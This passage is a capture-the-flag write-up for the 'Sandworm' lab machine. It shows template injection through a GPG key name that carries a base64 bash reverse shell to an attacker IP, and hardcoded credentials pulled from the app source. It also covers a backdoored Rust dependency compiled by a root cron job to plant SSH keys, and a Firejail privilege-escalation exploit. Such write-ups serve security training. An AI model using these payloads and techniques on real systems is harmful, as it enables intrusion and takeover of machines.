9/tm4URbbp66ovCIMjG22Fr5DFs4j/e5yQuUpN3w3hvTPkfUWjDjBEHyREnOEi6a
tJzjicjwffe2Ph+osJfadPe8+qPkyu+uHjvqPTLRXEYguBR622YrsWKOQq0utLxc
VdCTwuv4SPQdigVaPKjIFPZkHj4iDZAZvIvmRkhLyiIgbObzrODhpvJjGMkF2MGL
bOGGmr9JugR/jSKOJHHyWaJYRrGh3/h2X5uaB9SmVFLXgYqgvNM1wNKlxQkzN1Sf
Cg/3t8iazOD8VaWOD31JcI5FyZQXZtLdLd+g3PfaiTCC/lmAR/gx3qP0aO9RZ8E5
E7GRizP4OV/uKNLr4E6cNMURRayk/lD+aZBtNpditGFsW3qm6UhhYApma5kS+te5
HC+lTN4VL/aoTAf0CcdEQdwEIp0sBzBLNK1ElFdARTY=
=Ihvx
-----END PGP PUBLIC KEY BLOCK-----

$ rm test.html.asc ; gpg --sign --armor test.html ; cat test.html.asc
-----BEGIN PGP MESSAGE-----

owGbwMvMwMW4tnBGWvE0LVXGNalJnCWpxSV6GSW5OSlfFrrbgBh2XDYZqYkpdjb6
YIrLJik/pRJI6UNorupqBXMtc4XaWi4um8zcdIXiomRbJUMDPRAy0TO01AcKKino
g3RAjOtk3MzCwMjFICumyHKYWXDWvpDb7b89lc7A3MHKBLKbgYtTACbC0cj932GR
XuJsiZVflCr63Oe/02azX5AQyX4iYqaPQvFFdcaGTXduaDef5ypc4ipRsE1s/aa0
goQXfi0SIiLLi+s932yTLcm3PJTM+irYy3rj4neTm9YKhs+6JfXYaOGXG6cSfogX
2+iXK/xPkucuen/vZhWvcfO66ZNNNtp65D5bUPp8E9vZgvL59ye0iZW85Pi7Puiv
wlv+H0nTAgxdqxxzQ+7WfUlid6myWjYx7nrD97vFD82kI19PP6evpnU77NJ5dzM1
z1mSmiWHK7m4JnzSa6myXNTxdolg8et9BrdS1gpkS7X6t07WmWL2fvlFjsi3+i/b
91T8kD98wIjL3UXO/kruAqGPei3W6csT1syvVXs0XyjIZFrUlVnWVw+y3c7IuFz3
WvEvn+Nvye8K50LMH84Rswu8fKUldyWXBFd9ifOs3ms/Qye7F772r72Wdudgn3ji
ha2PONZc+Xj88UXpLg9WEdOKCoEXX+rM15yTvvE37/qz3E37Pff5LTOp1zBkDk2+
3u+72vp9scSzrrygPBv7m4sA
=JPF0
-----END PGP MESSAGE-----
```

![id executed](/assets/images/2023/11/Sandworm/id.png "id executed")

I knew I could run commands on the server. I used that to get a reverse shell. I started by generating a base64 encoded reverse shell to make sure my payload did not have forbidden characters.

```bash
$ echo 'bash  -i >& /dev/tcp/10.10.14.19/4444 0>&1  ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTkvNDQ0NCAwPiYxICAK
```

Then I generated a new key, using the reverse shell code as the name.

```bash
$ gpg --full-generate-key
gpg (GnuPG) 2.2.40; Copyright (C) 2022 g10 Code GmbH
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

...

Real name: {% raw %}{{request.application.__globals__.__builtins__.__import__('os').popen('echo -n YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTkvNDQ0NCAwPiYxICAK|base64 -d | bash').read()}}{% endraw %}
Email address: test@test.com
```

I started a netcat listener on my machine, then sent a message signed with that key.


```bash
$ nc -klvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.19] from (UNKNOWN) [10.129.229.16] 39356
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
/usr/local/sbin/lesspipe: 1: dirname: not found
atlas@sandworm:/var/www/html/SSA$ whoami
whoami
Could not find command-not-found database. Run 'sudo apt update' to populate it.
whoami: command not found
atlas@sandworm:/var/www/html/SSA$
```

## User silentobserver

Once connected to the server, I quickly found I couldn't do much on it.

```bash
atlas@sandworm:/var/www/html/SSA$ whoami
whoami
Could not find command-not-found database. Run 'sudo apt update' to populate it.
whoami: command not found

atlas@sandworm:/var/www/html/SSA$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)

atlas@sandworm:/var/www/html/SSA$ sudo -l
sudo -l
Could not find command-not-found database. Run 'sudo apt update' to populate it.
sudo: command not found

atlas@sandworm:/var/www/html/SSA$ find / -perm /u=s
find / -perm /u=s
Could not find command-not-found database. Run 'sudo apt update' to populate it.
find: command not found

atlas@sandworm:/var/www/html/SSA$ ps aux --forest
ps aux --forest
Could not find command-not-found database. Run 'sudo apt update' to populate it.
ps: command not found

atlas@sandworm:/var/www/html/SSA$ which curl
which curl
Could not find command-not-found database. Run 'sudo apt update' to populate it.
which: command not found

atlas@sandworm:/var/www/html/SSA$ which wget
which wget
Could not find command-not-found database. Run 'sudo apt update' to populate it.
which: command not found

atlas@sandworm:/var/www/html/SSA$ ls -l /bin
ls -l /bin
lrwxrwxrwx 1 nobody nogroup 7 Apr 23  2020 /bin -> usr/bin

atlas@sandworm:/var/www/html/SSA$ ls -l /usr/bin
ls -l /usr/bin
total 14300
-rwxr-xr-x 1 nobody nogroup   35328 Sep  4 11:42 base64
-rwxr-xr-x 1 nobody nogroup   35328 Sep  4 11:42 basename
-rwxr-xr-x 1 nobody nogroup 1396520 Sep  4 11:42 bash
-rwxr-xr-x 1 nobody nogroup   35280 Sep  4 11:42 cat
-rwxr-xr-x 1 nobody nogroup  125688 Sep  4 11:42 dash
-rwxr-xr-x 1 nobody nogroup     948 Sep  4 11:42 flask
-rwxr-xr-x 1 nobody nogroup 4898752 Sep  4 11:42 gpg
-rwxr-xr-x 1 nobody nogroup 1960456 Sep  4 11:42 gpg-agent
-rwxr-xr-x 1 nobody nogroup   35328 Sep  4 11:42 groups
-rwxr-xr-x 1 nobody nogroup   39424 Sep  4 11:42 id
-rwxr-xr-x 1 nobody nogroup    9047 Sep  4 11:42 lesspipe
-rwxr-xr-x 1 nobody nogroup  138208 Sep  4 11:42 ls
lrwxrwxrwx 1 nobody nogroup      19 Sep  4 11:42 python3 -> /usr/bin/python3.10
-rwxr-xr-x 1 nobody nogroup 5912968 Sep  4 11:42 python3.10
lrwxrwxrwx 1 nobody nogroup      13 Sep  4 11:42 sh -> /usr/bin/dash
```

I thought I might be in a Docker container. But the hostname (sandworm) did not look like a Docker hostname. And there was no `.dockerenv` file at the root.

```bash
atlas@sandworm:/var/www/html/SSA$ ls -la /
ls -la /
total 10628
drwxr-xr-x  19 nobody nogroup     4096 Jun  7 13:53 .
drwxr-xr-x  19 nobody nogroup     4096 Jun  7 13:53 ..
lrwxrwxrwx   1 nobody nogroup        7 Apr 23  2020 bin -> usr/bin
dr--------   2 nobody nogroup       40 Sep  4 11:42 boot
drwxr-xr-x   2 nobody nogroup     4096 Jun  7 13:53 cdrom
-rw-------   1 nobody nogroup 10846208 Nov 24  2022 core
drwxr-xr-x   7 nobody nogroup      380 Sep  4 11:42 dev
drwxr-xr-x 109 nobody nogroup     4060 Sep  4 11:42 etc
drwxr-xr-x   4 nobody nogroup     4096 May  4 15:19 home
lrwxrwxrwx   1 nobody nogroup        7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 nobody nogroup        9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 nobody nogroup        9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 nobody nogroup       10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 nobody nogroup    16384 May  7  2020 lost+found
drwxr-xr-x   2 nobody nogroup     4096 Apr 23  2020 media
drwxr-xr-x   2 nobody nogroup     4096 Jun  7 13:53 mnt
drwxr-xr-x   2 nobody nogroup       40 Sep  4 11:42 opt
dr-xr-xr-x 274 nobody nogroup        0 Sep  4 11:42 proc
drwx------   7 nobody nogroup     4096 Sep  4 11:43 root
drwxr-xr-x  29 nobody nogroup      840 Sep  4 11:42 run
lrwxrwxrwx   1 nobody nogroup        8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   2 nobody nogroup     4096 Jun  7 13:53 srv
dr-xr-xr-x  13 nobody nogroup        0 Sep  4 11:41 sys
drwxrwxrwt   3 nobody nogroup       60 Sep  4 11:42 tmp
drwxr-xr-x  14 nobody nogroup     4096 Jun  6 11:49 usr
drwxr-xr-x   3 nobody nogroup       60 Sep  4 11:42 var
```

I looked at the source code of the application. One file had the password used to connect to MySQL.

```python
cat __init__.py
from flask import Flask
from flask_login import LoginManager
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy()

def create_app():
    app = Flask(__name__)

    app.config['SECRET_KEY'] = '91668c1bc67132e3dcfb5b1a3e0c5c21'
    app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://atlas:GarlicAndOnionZ42@127.0.0.1:3306/SSA'

    db.init_app(app)

    # blueprint for non-auth parts of app
    from .app import main as main_blueprint
    app.register_blueprint(main_blueprint)

    login_manager = LoginManager()
    login_manager.login_view = "main.login"
    login_manager.init_app(app)

    from .models import User
    @login_manager.user_loader
    def load_user(user_id):
        return User.query.get(int(user_id))

    return app
```

Another one had the passphrase used with GPG.

```python
cat app.py
from flask import Flask, render_template, Response, flash, request, Blueprint, redirect, flash, url_for, render_template_string, jsonify
from flask_login import login_required, login_user, logout_user
from werkzeug.security import check_password_hash
import hashlib
from . import db
import os
from datetime import datetime
import gnupg
from SSA.models import User

main = Blueprint('main', __name__)

gpg = gnupg.GPG(gnupghome='/home/atlas/.gnupg', options=['--ignore-time-conflict'])

@main.route("/")
def home():
    return render_template("index.html", name="home")

@main.route("/about")
def about():
    return render_template("about.html", name="about")

@main.route("/contact", methods=('GET', 'POST',))
def contact():
    if request.method == 'GET':
        return render_template("contact.html", name="contact")
    tip = request.form['encrypted_text']
    if not validate(tip):
        return render_template("contact.html", error_msg="Message is not PGP-encrypted.")

    msg = gpg.decrypt(tip, passphrase='$M1DGu4rD$')

    if msg.data == b'':
        msg = 'Message was encrypted with an unknown PGP key.'
    else:
        tip = msg.data.decode('utf-8')
        msg = "Thank you for your submission."

    save(tip, request.environ.get('HTTP_X_REAL_IP', request.remote_addr))
    return render_template("contact.html", error_msg=msg)

...
```

I tried both passwords with SSH, but they did not work. The MySQL client was not available, and I could not download Chisel on the machine to open a tunnel.

I looked at what was available in the home folders.

```bash
atlas@sandworm:/var/www/html/SSA/SSA$ ls /home
ls /home
atlas
silentobserver

atlas@sandworm:/var/www/html/SSA/SSA$ ls -la /home/silentobserver
ls -la /home/silentobserver
ls: cannot open directory '/home/silentobserver': Permission denied

atlas@sandworm:/var/www/html/SSA/SSA$ ls -la /home/atlas
ls -la /home/atlas
total 44
drwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 .
drwxr-xr-x 4 nobody nogroup 4096 May  4 15:19 ..
lrwxrwxrwx 1 nobody nogroup    9 Nov 22  2022 .bash_history -> /dev/null
-rw-r--r-- 1 atlas  atlas    220 Nov 22  2022 .bash_logout
-rw-r--r-- 1 atlas  atlas   3771 Nov 22  2022 .bashrc
drwxrwxr-x 2 atlas  atlas   4096 Jun  6 08:49 .cache
drwxrwxr-x 3 atlas  atlas   4096 Feb  7  2023 .cargo
drwxrwxr-x 4 atlas  atlas   4096 Jan 15  2023 .config
drwx------ 4 atlas  atlas   4096 Sep  4 11:54 .gnupg
drwxrwxr-x 6 atlas  atlas   4096 Feb  6  2023 .local
-rw-r--r-- 1 atlas  atlas    807 Nov 22  2022 .profile
drwx------ 2 atlas  atlas   4096 Feb  6  2023 .ssh

atlas@sandworm:/var/www/html/SSA/SSA$ ls -la ~/.ssh
ls -la ~/.ssh
total 8
drwx------ 2 atlas atlas 4096 Feb  6  2023 .
drwxr-xr-x 8 atlas atlas 4096 Jun  7 13:44 ..
```

The `.ssh/` folder got me interested. But there was no key in it. I tried to insert mine.

```bash
atlas@sandworm:~$ echo 'PUBLIC KEY' >> ~/.ssh/authorized_keys
echo 'mykey' >> ~/.ssh/authorized_keys
bash: /home/atlas/.ssh/authorized_keys: Read-only file system
```

The home folder was readonly. I kept looking around.

```bash
atlas@sandworm:~$ ls -la .cache
ls -la .cache
total 8
drwxrwxr-x 2 atlas atlas 4096 Jun  6 08:49 .
drwxr-xr-x 8 atlas atlas 4096 Jun  7 13:44 ..
-rw-r--r-- 1 atlas atlas    0 Feb  6  2023 motd.legal-displayed

atlas@sandworm:~$ ls -la .cargo
ls -la .cargo
total 12
drwxrwxr-x 3 atlas atlas 4096 Feb  7  2023 .
drwxr-xr-x 8 atlas atlas 4096 Jun  7 13:44 ..
-rw-rw-r-- 1 atlas atlas    0 Feb  7  2023 .package-cache
drwxrwxr-x 5 atlas atlas 4096 Jun  6 08:24 registry

atlas@sandworm:~$ ls -la .config
ls -la .config
total 12
drwxrwxr-x 4 atlas  atlas   4096 Jan 15  2023 .
drwxr-xr-x 8 atlas  atlas   4096 Jun  7 13:44 ..
dr-------- 2 nobody nogroup   40 Sep  4 11:42 firejail
drwxrwxr-x 3 nobody atlas   4096 Jan 15  2023 httpie
```

The firejail folder was promising. I've seen a recent [ippsec video](https://www.youtube.com/watch?v=IX4h5aaSK1g) where he escaped [Firejail](https://firejail.wordpress.com/) in [Cerebrus](https://www.hackthebox.com/machines/cerberus).

I found a [Python script](https://www.openwall.com/lists/oss-security/2022/06/08/10/1) that would allow me to get root using Firejail. But I could not run the firejail command.

```bash
atlas@sandworm:~$ firejail
firejail
Could not find command-not-found database. Run 'sudo apt update' to populate it.
firejail: command not found
```

I kept looking in the home folder and I found some credentials in a configuration file.

```bash
atlas@sandworm:/var/www/html/SSA/SSA$ cat ~/.config/httpie/sessions/localhost_5000/admin.json
```

```json
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "REDACTED",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```

I used the credentials to reconnect with SSH.

```bash
$ ssh silentobserver@target
silentobserver@target's password:
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Sep  2 04:49:42 PM UTC 2023

  System load:           0.0
  Usage of /:            76.7% of 11.65GB
  Memory usage:          16%
  Swap usage:            0%
  Processes:             228
  Users logged in:       0
  IPv4 address for eth0: 10.129.229.16
  IPv6 address for eth0: dead:beef::250:56ff:feb0:6493

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Jun 12 12:03:09 2023 from 10.10.14.31

silentobserver@sandworm:~$ ls -la
total 40
drwxr-x--- 6 silentobserver silentobserver 4096 Jun  6 08:52 .
drwxr-xr-x 4 root           root           4096 May  4 15:19 ..
lrwxrwxrwx 1 root           root              9 Nov 22  2022 .bash_history -> /dev/null
-rw-r--r-- 1 silentobserver silentobserver  220 Nov 22  2022 .bash_logout
-rw-r--r-- 1 silentobserver silentobserver 3771 Nov 22  2022 .bashrc
drwx------ 2 silentobserver silentobserver 4096 May  4 15:26 .cache
drwxrwxr-x 3 silentobserver silentobserver 4096 May  4 16:59 .cargo
drwx------ 4 silentobserver silentobserver 4096 May  4 15:22 .gnupg
drwx------ 4 silentobserver silentobserver 4096 Nov 22  2022 .local
-rw-r--r-- 1 silentobserver silentobserver  807 Nov 22  2022 .profile
-rw-r----- 1 root           silentobserver   33 Sep  2 16:19 user.txt

silentobserver@sandworm:~$ cat user.txt
REDACTED
```

## User atlas

I was finally out of the jail. I looked for ways to become root.

```bash
silentobserver@sandworm:~$ sudo -l
[sudo] password for silentobserver:
Sorry, user silentobserver may not run sudo on localhost.

silentobserver@sandworm:~$ find / -perm /u=s -ls 2>/dev/null
    13323  57668 -rwsrwxr-x   2 atlas    atlas    59047248 Jun  6 10:00 /opt/tipnet/target/debug/tipnet
    11566  54924 -rwsrwxr-x   1 atlas    atlas    56234960 May  4 18:06 /opt/tipnet/target/debug/deps/tipnet-a859bd054535b3c1
    13323  57668 -rwsrwxr-x   2 atlas    atlas    59047248 Jun  6 10:00 /opt/tipnet/target/debug/deps/tipnet-dabc93f7704f7b48
     1344   1740 -rwsr-x---   1 root     jailer    1777952 Nov 29  2022 /usr/local/bin/firejail
    10841     36 -rwsr-xr--   1 root     messagebus    35112 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    14179    332 -rwsr-xr-x   1 root     root         338536 Nov 23  2022 /usr/lib/openssh/ssh-keysign
     7154     20 -rwsr-xr-x   1 root     root          18736 Feb 26  2022 /usr/libexec/polkit-agent-helper-1
     5693     48 -rwsr-xr-x   1 root     root          47480 Feb 21  2022 /usr/bin/mount
     6360    228 -rwsr-xr-x   1 root     root         232416 Apr  3 18:00 /usr/bin/sudo
     6579     72 -rwsr-xr-x   1 root     root          72072 Nov 24  2022 /usr/bin/gpasswd
     5818     36 -rwsr-xr-x   1 root     root          35192 Feb 21  2022 /usr/bin/umount
     6580     60 -rwsr-xr-x   1 root     root          59976 Nov 24  2022 /usr/bin/passwd
     6152     44 -rwsr-xr-x   1 root     root          44808 Nov 24  2022 /usr/bin/chsh
     6151     72 -rwsr-xr-x   1 root     root          72712 Nov 24  2022 /usr/bin/chfn
     6564     40 -rwsr-xr-x   1 root     root          40496 Nov 24  2022 /usr/bin/newgrp
     9004     56 -rwsr-xr-x   1 root     root          55672 Feb 21  2022 /usr/bin/su
     5108     36 -rwsr-xr-x   1 root     root          35200 Mar 23  2022 /usr/bin/fusermount3

silentobserver@sandworm:~$ groups
silentobserver

silentobserver@sandworm:~$ /usr/local/bin/firejail
-bash: /usr/local/bin/firejail: Permission denied
```

Firejail had the suid bit set. But I was not in the 'jailer' group, so I could not execute it.

I uploaded [pspy](https://github.com/DominicBreuker/pspy) and ran it to see what was running on the server.

```bash
2023/09/02 17:02:01 CMD: UID=0     PID=2889   | /usr/sbin/CRON -f -P
2023/09/02 17:02:01 CMD: UID=0     PID=2888   | /usr/sbin/CRON -f -P
2023/09/02 17:02:01 CMD: UID=0     PID=2892   | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/09/02 17:02:01 CMD: UID=0     PID=2890   | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/09/02 17:02:01 CMD: UID=0     PID=2893   | /bin/sh -c sleep 10 && /root/Cleanup/clean_c.sh
2023/09/02 17:02:01 CMD: UID=0     PID=2894   | sleep 10
2023/09/02 17:02:01 CMD: UID=0     PID=2895   | /bin/sudo -u atlas /usr/bin/cargo run --offline
2023/09/02 17:02:01 CMD: UID=1000  PID=2896   | /usr/bin/cargo run --offline
2023/09/02 17:02:01 CMD: UID=1000  PID=2897   | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro -Csplit-debuginfo=packed
2023/09/02 17:02:01 CMD: UID=1000  PID=2899   | rustc - --crate-name ___ --print=file-names --crate-type bin --crate-type rlib --crate-type dylib --crate-type cdylib --crate-type staticlib --crate-type proc-macro --print=sysroot --print=cfg
2023/09/02 17:02:01 CMD: UID=1000  PID=2901   | rustc -vV
2023/09/02 17:02:11 CMD: UID=0     PID=2905   | /bin/bash /root/Cleanup/clean_c.sh
2023/09/02 17:02:11 CMD: UID=0     PID=2906   | /bin/rm -r /opt/crates
2023/09/02 17:02:11 CMD: UID=0     PID=2907   | /bin/bash /root/Cleanup/clean_c.sh
2023/09/02 17:02:11 CMD: UID=0     PID=2908   | /usr/bin/chmod u+s /opt/tipnet/target/debug/tipnet
```

There was a cron that ran [Cargo](https://doc.rust-lang.org/cargo/), the Rust package manager and compiled an application every two minutes. I ignored it at first, I was trying to get to root, not go back to the user atlas.

I kept looking at the server. I found some credentials in the database, but failed to crack the hashes. Eventually I remembered that the shell I had as atlas was very limited because it was in a jail. Maybe if I could have a normal shell as atlas, I would be able to do more. The firejail exploit looked like an interesting possibility.

I took a second look at what the cron was doing. It compiled the 'tipnet' application. I was not able to modify files in this application.

```bash
silentobserver@sandworm:~$ ls -l /opt/tipnet/
total 92
-rw-rw-r-- 1 atlas atlas 28165 Sep  4 13:24 access.log
-rw-r--r-- 1 root  atlas 46161 May  4 16:38 Cargo.lock
-rw-r--r-- 1 root  atlas   288 May  4 15:50 Cargo.toml
drwxr-xr-x 2 root  atlas  4096 Jun  6 11:49 src
drwxr-xr-x 3 root  atlas  4096 Jun  6 11:49 target

silentobserver@sandworm:~$ ls -l /opt/tipnet/src/
total 8
-rwxr-xr-- 1 root atlas 5795 May  4 16:55 main.rs

silentobserver@sandworm:~$ ls -l /opt/tipnet/src/
total 8
-rwxr-xr-- 1 root atlas 5795 May  4 16:55 main.rs

silentobserver@sandworm:~$ ls -l /opt/tipnet/target/
total 8
-rwxr-xr-- 1 root atlas  177 Feb  8  2023 CACHEDIR.TAG
drwxrwxr-x 7 root atlas 4096 Jun  6 11:49 debug
```

The user atlas had some write permission. But the folder was not mounted in the jail.

```bash
atlas@sandworm:~$ ls -l /opt
ls -l /opt
total 0
```

The cron was also running Cargo before it compiled the application. I looked at the application 'Cargo.toml' file.

```ini
[package]
name = "tipnet"
version = "0.1.0"
edition = "2021"

# See more keys and their definitions at https://doc.rust-lang.org/cargo/reference/manifest.html

[dependencies]
chrono = "0.4"
mysql = "23.0.1"
nix = "0.18.0"
logger = {path = "../crates/logger"}
sha2 = "0.9.0"
hex = "0.4.3"
```

It included a local library, and I was able to write to the source file of this library.

```bash
silentobserver@sandworm:~$ ls -l /opt/crates/logger/
total 24
-rw-r--r-- 1 atlas silentobserver 11644 May  4 17:11 Cargo.lock
-rw-r--r-- 1 atlas silentobserver   190 May  4 17:08 Cargo.toml
drwxrwxr-x 2 atlas silentobserver  4096 May  4 17:12 src
drwxrwxr-x 3 atlas silentobserver  4096 May  4 17:08 target

silentobserver@sandworm:~$ ls -l /opt/crates/logger/src/
total 4
-rw-rw-r-- 1 atlas silentobserver 732 May  4 17:12 lib.rs
```

To validate that I could use it, I modify the logger source code to create a file in `/tmp`. I used [Command](https://doc.rust-lang.org/std/process/struct.Command.html) to run instructions on the server.


```rust
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
        Command::new("touch")
        .args(["/tmp/pwn"])
        .spawn()
        .expect("pwn command failed to start");


    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);
...
```

My first attempt failed. Some script was overwriting my changes. I copied the original file in my home folder and modified the copy. Then I used `watch` to overwrite the original source file with my copy every second.

```bash
watch -n1 -d cp ~/lib.rs /opt/crates/logger/src/lib.rs
```

I waited for the cron to run. When it did, a new file appeared in `/tmp`.

```bash
silentobserver@sandworm:~$ ls -ltr /tmp/
total 20
drwx------ 3 root  root  4096 Sep  4 11:42 systemd-private-d00baca0a019457d8da685debcebb650-systemd-resolved.service-eeJseY
drwx------ 3 root  root  4096 Sep  4 11:42 systemd-private-d00baca0a019457d8da685debcebb650-systemd-timesyncd.service-4zJ9OS
drwx------ 3 root  root  4096 Sep  4 11:42 systemd-private-d00baca0a019457d8da685debcebb650-systemd-logind.service-GRcAPR
drwx------ 3 root  root  4096 Sep  4 11:42 systemd-private-d00baca0a019457d8da685debcebb650-ModemManager.service-B7NLVN
drwx------ 2 root  root  4096 Sep  4 11:43 vmware-root_818-2957124693
-rw-rw-r-- 1 atlas atlas    0 Sep  4 13:42 pwn
```

I saved my SSH public key on the server, and modified the code to copy it in atlas' home folder.

```rust
pub fn log(user: &str, query: &str, justification: &str) {
	Command::new("cp")
        .args(["/tmp/authorized_keys", "/home/atlas/.ssh/"])
        .spawn()
        .expect("ls command failed to start");
```

I used the same technique to make sure my modifications were present when the code was compiled and waited for the cron to run.

Then I reconnected as atlas.

```bash
$ ssh atlas@target
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-73-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Sep  4 01:48:13 PM UTC 2023

  System load:           0.0
  Usage of /:            77.0% of 11.65GB
  Memory usage:          22%
  Swap usage:            0%
  Processes:             229
  Users logged in:       1
  IPv4 address for eth0: 10.129.229.16
  IPv6 address for eth0: dead:beef::250:56ff:feb0:7089

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


atlas@sandworm:~$
```

## root

Once connected as atlas, I had a pretty good idea of the path to root. I confirmed that I could run firejail now that I was outside the jail.

```bash
atlas@sandworm:~$ groups
atlas jailer

atlas@sandworm:~$ ls -l /usr/local/bin/firejail
-rwsr-x--- 1 root jailer 1777952 Nov 29  2022 /usr/local/bin/firejail
```

I was in the jailer group, so I could run it. I downloaded the [exploit script](https://www.openwall.com/lists/oss-security/2022/06/08/10/1) I found earlier and ran it.

```bash
atlas@sandworm:~$ ./exploit.py
You can now run 'firejail --join=6158' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

I opened a new terminal and joined the jail the script created.

```bash
atlas@sandworm:~$ /usr/local/bin/firejail --join=6158
changing root to /proc/6158/root
Warning: cleaning all supplementary groups
Child process initialized in 3.99 ms

atlas@sandworm:~$ sudo su -
atlas is not in the sudoers file.  This incident will be reported.

atlas@sandworm:~$ su
root@sandworm:/home/atlas# cat /root/root.txt
REDACTED
```